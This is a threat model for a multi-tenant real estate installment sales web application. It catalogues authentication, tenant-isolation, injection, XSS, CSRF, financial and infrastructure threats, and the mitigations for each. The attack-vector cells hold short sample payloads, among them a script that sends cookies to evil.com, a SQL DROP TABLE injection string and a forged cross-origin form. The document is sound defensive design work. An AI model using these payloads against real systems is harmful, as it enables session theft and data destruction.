# Threat Model

**Project:** Aqar Elite — Multi-Tenant Real Estate Installment Sales System  
**Document ID:** RA-HR-2026-1110-THREATS  
**Version:** 1.0  
**Last Updated:** 2026-11-10

---

## Purpose

This document identifies security threats relevant to the Aqar Elite system, assesses their risk level, and defines the mitigation strategies implemented or planned. The threat model follows a category-based approach aligned with the system's attack surfaces.

## Risk Level Definitions

| Level | Description |
|-------|-------------|
| **Critical** | Exploitation leads to full system compromise, cross-tenant data breach, or financial manipulation |
| **High** | Exploitation leads to unauthorized access, data exposure within a tenant, or integrity violation |
| **Medium** | Exploitation leads to limited information disclosure, denial of service, or degraded security posture |
| **Low** | Exploitation requires significant effort for minimal impact, or is a defense-in-depth concern |

---

## 1. Authentication Threats

### T-AUTH-001: Brute Force Password Attack

| Attribute | Detail |
|-----------|--------|
| **Description** | An attacker systematically attempts all possible passwords against a known user account (email) via the login endpoint |
| **Risk Level** | High |
| **Attack Vector** | Automated POST requests to `/api/auth/login` with dictionary/brute-force password lists |
| **Impact** | Unauthorized account access, potential cross-tenant data exposure if the compromised user has ADMIN privileges |
| **Mitigation** | **Rate limiting (REQ-009):** Per-IP rate limiting (e.g., 10 attempts per minute) and per-account rate limiting (e.g., 5 failed attempts lock the account for 15 minutes). Progressive delays increase with failed attempts. Implementation in `src/lib/auth/rate-limiter.ts`. |
| **Residual Risk** | Distributed attacks across many IPs may evade per-IP limits; mitigated by per-account limits |

### T-AUTH-002: Credential Stuffing

| Attribute | Detail |
|-----------|--------|
| **Description** | Attacker uses email/password pairs from breached third-party databases to attempt login, exploiting password reuse |
| **Risk Level** | High |
| **Attack Vector** | Automated login attempts using large credential databases (e.g., from public breaches) |
| **Impact** | Account takeover if users reuse passwords across services |
| **Mitigation** | **Rate limiting (REQ-009)** with per-IP throttling. **Generic error messages (REQ-008)** — login failures return "Invalid email or password" without revealing whether the email exists. **Argon2id hashing (REQ-004)** — even if the database is breached, passwords are computationally expensive to crack. |
| **Residual Risk** | If a user's exact credentials are in a breach database and they reuse the password, rate limiting is the only defense. Password complexity policies are out of scope but recommended for production. |

### T-AUTH-003: Session Hijacking

| Attribute | Detail |
|-----------|--------|
| **Description** | Attacker steals a valid session token to impersonate an authenticated user |
| **Risk Level** | Critical |
| **Attack Vector** | Man-in-the-middle (MITM) attack intercepting the session cookie, XSS-based cookie theft, physical access to the client machine |
| **Impact** | Full account impersonation, access to all data within the user's tenant and role permissions |
| **Mitigation** | **HttpOnly cookies (REQ-005)** — cookie is inaccessible to JavaScript, preventing XSS-based theft. **Secure flag (REQ-005)** — cookie only transmitted over HTTPS, preventing MITM interception. **SameSite=Lax (REQ-005)** — cookie not sent on cross-origin requests, preventing CSRF-adjacent attacks. **Session expiration (REQ-007)** — sessions have a finite TTL, limiting the window for stolen tokens. **Hashed tokens in database (ADR-005)** — database breach doesn't expose usable session tokens. |
| **Residual Risk** | Physical access to the client machine while a session is active; mitigated by session expiration |

### T-AUTH-004: Session Fixation

| Attribute | Detail |
|-----------|--------|
| **Description** | Attacker forces a victim to use a known session ID, then uses that session ID to access the victim's authenticated session |
| **Risk Level** | Medium |
| **Attack Vector** | Attacker sets a session cookie in the victim's browser before login |
| **Impact** | Account impersonation after the victim authenticates |
| **Mitigation** | **New session on login** — a fresh session token is generated on every successful login, discarding any pre-existing token. The previous session (if any) is invalidated server-side. |
| **Residual Risk** | Low — standard session regeneration eliminates this attack |

### T-AUTH-005: Timing Attack on Login

| Attribute | Detail |
|-----------|--------|
| **Description** | Attacker measures response time differences between "user exists" and "user doesn't exist" to enumerate valid email addresses |
| **Risk Level** | Low |
| **Attack Vector** | Timing side-channel on the login endpoint; password hashing only occurs if the user is found |
| **Impact** | Email enumeration — attacker learns which emails are registered |
| **Mitigation** | **Constant-time response** — when a user is not found, the system still performs a dummy password hash operation to equalize response times. **Generic error messages (REQ-008)** — same message for both cases. |
| **Residual Risk** | Statistical timing attacks may still distinguish patterns at scale; mitigated by rate limiting |

---

## 2. Authorization Threats

### T-AUTHZ-001: Privilege Escalation (Vertical)

| Attribute | Detail |
|-----------|--------|
| **Description** | A user with a lower-privilege role (e.g., SALES) attempts to access functionality restricted to a higher-privilege role (e.g., ADMIN or ACCOUNTANT) |
| **Risk Level** | Critical |
| **Attack Vector** | Direct API calls to endpoints that should be role-restricted (e.g., SALES user POSTing to `/api/units` which requires ADMIN, or SALES user calling the payment recording endpoint which requires ACCOUNTANT) |
| **Impact** | Unauthorized data creation, modification, or approval; financial manipulation |
| **Mitigation** | **Server-side role checks (REQ-002)** on every API route handler and server action. Role is read from the server-side session, never from client input. Implementation in `src/lib/auth/rbac.ts` with a `requireRole()` guard function. **Defense in depth:** UI hides unauthorized actions, but the server enforces independently. |
| **Residual Risk** | Low — server-side enforcement is independent of client-side UI |

### T-AUTHZ-002: Insecure Direct Object Reference (IDOR)

| Attribute | Detail |
|-----------|--------|
| **Description** | A user manipulates resource IDs in API requests to access or modify resources belonging to other users or other tenants |
| **Risk Level** | Critical |
| **Attack Vector** | Changing an ID parameter (e.g., `/api/clients/abc123` → `/api/clients/xyz789`) to access another SALES agent's client, or another company's data |
| **Impact** | Cross-tenant data access, unauthorized modification of other users' data |
| **Mitigation** | **CompanyId scoping (REQ-054, REQ-055)** — all queries include a `WHERE companyId = ?` clause with the companyId derived from the session, not from the request. **Ownership verification (REQ-056)** — for resources with ownership (e.g., clients owned by a SALES agent), the service layer verifies `agentId = currentUserId` before allowing mutations. **Nested resource validation** — when accessing installments, the system verifies the chain: installment → contract → company matches the session's companyId. |
| **Residual Risk** | Low — multiple layers of verification (company, ownership, resource chain) |

### T-AUTHZ-003: Role Manipulation via Request Tampering

| Attribute | Detail |
|-----------|--------|
| **Description** | Attacker includes a `role` field in request body to change their own role or create a user with an elevated role |
| **Risk Level** | High |
| **Attack Vector** | Sending `{ "role": "ADMIN" }` in API request bodies |
| **Impact** | Privilege escalation, unauthorized administrative access |
| **Mitigation** | **No user management endpoints** — the system does not expose any API for creating or modifying users (REQ-003). **Zod schema validation (ADR-004)** — request schemas explicitly define accepted fields; unknown fields are stripped (`.strict()` or default behavior). The `role` field is never accepted from client input in any endpoint. |
| **Residual Risk** | Negligible — no mechanism exists to change roles through the application |

---

## 3. Multi-Tenant Threats

### T-TENANT-001: Cross-Tenant Data Access

| Attribute | Detail |
|-----------|--------|
| **Description** | A user in Company A accesses or modifies data belonging to Company B |
| **Risk Level** | Critical |
| **Attack Vector** | IDOR with cross-company resource IDs, SQL injection altering query scope, or application bug omitting the companyId filter |
| **Impact** | Complete tenant isolation breach — confidential business data, client information, and financial records exposed |
| **Mitigation** | **Server-side companyId derivation (REQ-054)** — companyId is extracted from the session, never from request parameters. **Mandatory query scoping (REQ-055)** — repository layer enforces `companyId` on every query by design; no "unscoped" query methods are exposed. **Integration tests** — dedicated tenant isolation tests create data in two tenants and verify cross-access is impossible. |
| **Residual Risk** | Application bugs could still omit scoping in new code paths; mitigated by code review, integration tests, and repository-level enforcement |

### T-TENANT-002: Tenant ID Forgery

| Attribute | Detail |
|-----------|--------|
| **Description** | Attacker submits a fabricated `companyId` in request headers, body, or URL to impersonate another tenant |
| **Risk Level** | Critical |
| **Attack Vector** | Including `companyId` in request payload: `{ "companyId": "other-tenant-id", ... }` |
| **Impact** | Data created in the wrong tenant, cross-tenant data access |
| **Mitigation** | **CompanyId never from client (REQ-054)** — the field is stripped from all request bodies by Zod schemas. Even if included, it is ignored; the server uses only the session-derived value. **Zod strict parsing** — schemas define only the expected fields; additional fields are rejected or stripped. |
| **Residual Risk** | Negligible — architectural design eliminates this vector |

---

## 4. Data Integrity Threats

### T-DATA-001: SQL Injection

| Attribute | Detail |
|-----------|--------|
| **Description** | Attacker injects malicious SQL through user inputs (search filters, form fields, sort parameters) to read, modify, or delete data |
| **Risk Level** | Critical |
| **Attack Vector** | Malicious input in filter parameters, search terms, or sort column names: `?sort=price; DROP TABLE units;--` |
| **Impact** | Full database compromise — data exfiltration, data destruction, privilege escalation |
| **Mitigation** | **Prisma ORM (ADR-002)** — all standard queries use parameterized queries by default; user input is never concatenated into SQL. **Sort column allowlist (REQ-016)** — sort parameters are validated against a Zod `z.enum(["price", "area"])`, rejecting any other value. **Zod validation (ADR-004)** — all inputs are parsed and type-checked before reaching the database layer. **No raw SQL** — `$queryRaw` is used only with tagged template literals (Prisma's `Prisma.sql` template) which auto-parameterize. |
| **Residual Risk** | Low — ORM parameterization and input validation provide multiple layers of defense |

### T-DATA-002: Mass Assignment

| Attribute | Detail |
|-----------|--------|
| **Description** | Attacker includes unexpected fields in request body to modify protected attributes (e.g., `status`, `companyId`, `role`, `approvedAt`) |
| **Risk Level** | High |
| **Attack Vector** | Sending `{ "name": "Unit A", "status": "sold", "companyId": "other-tenant" }` in a unit creation request |
| **Impact** | Bypassing business rules, modifying protected fields, cross-tenant data injection |
| **Mitigation** | **Zod schema validation (ADR-004)** — every endpoint has a schema that explicitly defines accepted fields. Unknown fields are stripped. Protected fields (`status`, `companyId`, `createdBy`, `approvedAt`) are never included in request schemas. **Service layer enforcement** — services set protected fields from server-side context, not from request data. |
| **Residual Risk** | Low — schema-first validation prevents unintended field assignment |

### T-DATA-003: Payment Amount Manipulation

| Attribute | Detail |
|-----------|--------|
| **Description** | Attacker submits a negative payment, a zero payment, or a payment exceeding the remaining balance to corrupt financial records |
| **Risk Level** | High |
| **Attack Vector** | `{ "amount": -50000 }` or `{ "amount": 999999999999 }` in payment creation request |
| **Impact** | Negative balance, overpayment, financial inconsistency |
| **Mitigation** | **Zod validation (REQ-043)** — payment amount is validated as a positive BigInt. **Server-side balance check (REQ-043)** — the service layer queries the current remaining balance (inside the transaction) and rejects payments exceeding it. **Database-level locking (REQ-049)** — `SELECT ... FOR UPDATE` on the contract row prevents concurrent payments from both succeeding when their combined amount would exceed the balance. |
| **Residual Risk** | Low — multiple layers of validation and locking |

---

## 5. Client-Side Threats

### T-CLIENT-001: Cross-Site Scripting (XSS) in Notes Fields

| Attribute | Detail |
|-----------|--------|
| **Description** | Attacker injects malicious JavaScript in free-text fields (client notes, unit descriptions) that executes when other users view the data |
| **Risk Level** | High |
| **Attack Vector** | Storing `<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>` in a client's notes field |
| **Impact** | Session cookie theft (mitigated by HttpOnly), page defacement, phishing attacks within the application |
| **Mitigation** | **React auto-escaping** — React automatically escapes all dynamic content rendered with `{}` in JSX, preventing script injection. **No `dangerouslySetInnerHTML`** — the codebase never uses raw HTML rendering for user-supplied content. **HttpOnly cookies (REQ-005)** — even if XSS succeeds, session cookies are inaccessible to JavaScript. **Content Security Policy (CSP)** — HTTP headers restrict script sources to same-origin only. |
| **Residual Risk** | Low — React's default escaping eliminates most XSS vectors; CSP provides defense in depth |

### T-CLIENT-002: Cross-Site Request Forgery (CSRF)

| Attribute | Detail |
|-----------|--------|
| **Description** | Attacker tricks an authenticated user's browser into making state-mutating requests (e.g., approving a contract, recording a payment) without the user's knowledge |
| **Risk Level** | High |
| **Attack Vector** | Malicious website with `<form action="https://aqarelite.com/api/contracts/approve" method="POST">` or fetch request from a different origin |
| **Impact** | Unauthorized state changes — contracts approved, payments recorded, reservations created |
| **Mitigation** | **CSRF tokens (REQ-010)** — all state-mutating requests (POST, PUT, PATCH, DELETE) require a valid CSRF token. The token is generated server-side and embedded in forms/headers. **SameSite=Lax cookies (REQ-005)** — session cookies are not sent on cross-origin POST requests. **Origin header validation** — API routes verify the `Origin` header matches the expected domain. **Double defense** — SameSite + CSRF token provides two independent layers. |
| **Residual Risk** | Low — double-layer protection eliminates standard CSRF vectors |

### T-CLIENT-003: localStorage Token Theft

| Attribute | Detail |
|-----------|--------|
| **Description** | If authentication tokens were stored in localStorage, any XSS vulnerability would allow an attacker to exfiltrate them |
| **Risk Level** | High (if applicable) |
| **Attack Vector** | XSS payload reading `localStorage.getItem('token')` |
| **Impact** | Permanent session theft (tokens in localStorage persist across tabs and sessions) |
| **Mitigation** | **No localStorage tokens (REQ-006)** — the system does not store any authentication material in localStorage. All authentication is via HttpOnly cookies, which are inaccessible to JavaScript. **E2E test verification** — a Playwright test asserts that no authentication tokens exist in localStorage after login. |
| **Residual Risk** | Eliminated by design — no tokens exist in localStorage |

---

## 6. Financial Threats

### T-FIN-001: Payment Replay (Duplicate Payment)

| Attribute | Detail |
|-----------|--------|
| **Description** | A payment request is submitted multiple times (network retry, user double-click, attacker replay) resulting in duplicate payment records |
| **Risk Level** | High |
| **Attack Vector** | User double-clicks the submit button, network timeout causes automatic retry, or attacker captures and replays a valid payment request |
| **Impact** | Duplicate payment records, overpayment, financial inconsistency, accounting discrepancies |
| **Mitigation** | **Idempotency key (REQ-048)** — every payment request includes a unique `idempotencyKey` (client-generated UUID). The database has a unique constraint on `(companyId, idempotencyKey)`. If a duplicate key is received, the system returns the existing payment record instead of creating a new one. **Database unique constraint** — enforced at the database level, not just application level, preventing race conditions between duplicate requests. |
| **Residual Risk** | Low — database-level unique constraint is the final guarantee |

### T-FIN-002: Overpayment via Concurrent Requests

| Attribute | Detail |
|-----------|--------|
| **Description** | Two simultaneous payment requests for the same contract, each checking the remaining balance independently, both proceeding because each sees sufficient balance, resulting in total payments exceeding the contract amount |
| **Risk Level** | Critical |
| **Attack Vector** | Two concurrent API requests to `/api/payments` for the same contract, submitted within milliseconds of each other |
| **Impact** | Total payments exceed contract value — financial loss, accounting corruption |
| **Mitigation** | **Database-level locking (REQ-049)** — the payment service uses `SELECT ... FOR UPDATE` on the contract row within a serializable transaction. The first transaction acquires the lock and proceeds; the second transaction blocks until the first commits, then re-reads the updated balance. If the remaining balance is now insufficient, the second payment is rejected. **Atomic transaction (REQ-047)** — payment + allocation + balance update occur in a single database transaction. |
| **Residual Risk** | Negligible — PostgreSQL's row-level locking guarantees serialized access |

### T-FIN-003: Floating-Point Precision Errors

| Attribute | Detail |
|-----------|--------|
| **Description** | Using JavaScript `number` (IEEE 754 float64) for financial calculations introduces rounding errors that accumulate over multiple operations |
| **Risk Level** | High |
| **Attack Vector** | Not an external attack — this is a correctness threat from implementation choices |
| **Impact** | Installment sums not equaling the remaining amount, pennies/fils gained or lost over time, auditing discrepancies |
| **Mitigation** | **BigInt minor units (REQ-040, REQ-041, ADR-003)** — all financial calculations use integer arithmetic with BigInt. **No `number` for money** — TypeScript types and code review enforce this. **Invariant tests (REQ-038)** — unit tests verify that `sum(installments) === remaining` for hundreds of test cases including edge cases. |
| **Residual Risk** | Eliminated by design — integer arithmetic has no precision loss |

### T-FIN-004: Discount Bypass

| Attribute | Detail |
|-----------|--------|
| **Description** | Attacker submits a discount amount exceeding the 5% cap to obtain an unfair price reduction |
| **Risk Level** | Medium |
| **Attack Vector** | Sending `{ "discount": 50000000 }` (50% of unit price) in contract creation request |
| **Impact** | Financial loss — unit sold significantly below market value |
| **Mitigation** | **Server-side validation (REQ-030)** — the service layer calculates `maxDiscount = unitPrice * 5n / 100n` and rejects any discount exceeding this amount. **Zod schema validation** — the discount field is validated as a non-negative BigInt. **Double check** — both the Zod schema and the service layer enforce the cap independently. |
| **Residual Risk** | Low — server-side calculation cannot be bypassed by client manipulation |

---

## 7. Infrastructure Threats

### T-INFRA-001: Secret Leakage

| Attribute | Detail |
|-----------|--------|
| **Description** | Sensitive configuration (database credentials, session secret, Argon2 parameters) is exposed through version control, logs, error messages, or client-side bundles |
| **Risk Level** | Critical |
| **Attack Vector** | Committing `.env` file to Git, logging database URLs in error handlers, including server-side secrets in client-side JavaScript bundles |
| **Impact** | Full database access, session forgery, complete system compromise |
| **Mitigation** | **`.gitignore` includes `.env*`** — environment files are never committed. **Environment variables** — all secrets are provided via environment variables, not hardcoded. **Next.js server/client boundary** — only `NEXT_PUBLIC_` prefixed variables are included in client bundles; all secrets use unprefixed names. **Error sanitization** — production error responses never include stack traces, database errors, or internal details. **Docker secrets** — Docker Compose can use secrets for sensitive values. |
| **Residual Risk** | Human error in committing secrets; mitigated by `.gitignore`, pre-commit hooks, and code review |

### T-INFRA-002: Dependency Vulnerabilities

| Attribute | Detail |
|-----------|--------|
| **Description** | Third-party npm packages contain known vulnerabilities (CVEs) that could be exploited |
| **Risk Level** | Medium |
| **Attack Vector** | Exploitation of known vulnerabilities in transitive dependencies |
| **Impact** | Varies by vulnerability — from information disclosure to remote code execution |
| **Mitigation** | **Dependency auditing** — `npm audit` run in CI pipeline, failing on high/critical vulnerabilities. **Lock file** — `package-lock.json` is committed to ensure reproducible builds. **Minimal dependencies** — the project uses a minimal set of well-maintained packages. **Automated updates** — Dependabot or Renovate configured for automated dependency update PRs. |
| **Residual Risk** | Zero-day vulnerabilities in dependencies; mitigated by defense-in-depth (input validation, CSP, sandboxing) |

### T-INFRA-003: Database Connection String Exposure

| Attribute | Detail |
|-----------|--------|
| **Description** | PostgreSQL connection string (including credentials) is exposed via error messages, logs, or health check endpoints |
| **Risk Level** | High |
| **Attack Vector** | Application error handler logging the full database URL, or a debugging endpoint exposing environment variables |
| **Impact** | Direct database access by attacker, bypassing all application-level controls |
| **Mitigation** | **Structured logging** — logger configuration explicitly excludes `DATABASE_URL` and other sensitive environment variables. **No debug endpoints in production** — health check endpoints return minimal information (HTTP 200, no connection details). **Docker networking** — PostgreSQL is not exposed on the host network; only the `app` service can reach it via Docker's internal network. |
| **Residual Risk** | Low — Docker network isolation and log sanitization provide multiple layers |

---

## Threat Summary Matrix

| ID | Threat | Risk | Mitigated By |
|----|--------|------|-------------|
| T-AUTH-001 | Brute Force | High | Rate limiting, Argon2id |
| T-AUTH-002 | Credential Stuffing | High | Rate limiting, generic errors, Argon2id |
| T-AUTH-003 | Session Hijacking | Critical | HttpOnly, Secure, SameSite, expiration, hashed tokens |
| T-AUTH-004 | Session Fixation | Medium | Session regeneration on login |
| T-AUTH-005 | Timing Attack | Low | Constant-time response, dummy hash |
| T-AUTHZ-001 | Privilege Escalation | Critical | Server-side role enforcement |
| T-AUTHZ-002 | IDOR | Critical | CompanyId scoping, ownership verification |
| T-AUTHZ-003 | Role Manipulation | High | No user management API, Zod strict schemas |
| T-TENANT-001 | Cross-Tenant Access | Critical | Server-side companyId, mandatory query scoping |
| T-TENANT-002 | Tenant ID Forgery | Critical | CompanyId from session only, Zod stripping |
| T-DATA-001 | SQL Injection | Critical | Prisma ORM, parameterized queries, sort allowlist |
| T-DATA-002 | Mass Assignment | High | Zod schemas, server-side protected field assignment |
| T-DATA-003 | Payment Manipulation | High | Validation, balance check, database locking |
| T-CLIENT-001 | XSS | High | React escaping, no dangerouslySetInnerHTML, CSP |
| T-CLIENT-002 | CSRF | High | CSRF tokens, SameSite cookies, Origin validation |
| T-CLIENT-003 | localStorage Theft | High | No localStorage tokens by design |
| T-FIN-001 | Payment Replay | High | Idempotency key, database unique constraint |
| T-FIN-002 | Concurrent Overpayment | Critical | SELECT FOR UPDATE, serialized transactions |
| T-FIN-003 | Float Precision | High | BigInt minor units, no `number` for money |
| T-FIN-004 | Discount Bypass | Medium | Server-side 5% cap validation |
| T-INFRA-001 | Secret Leakage | Critical | .gitignore, env vars, Next.js boundary, error sanitization |
| T-INFRA-002 | Dependency Vulns | Medium | npm audit, lock file, minimal deps |
| T-INFRA-003 | DB Connection Exposure | High | Structured logging, Docker networking |

---

## Change Log

| Date | Version | Author | Description |
|------|---------|--------|-------------|
| 2026-11-10 | 1.0 | System Architect | Initial threat model |
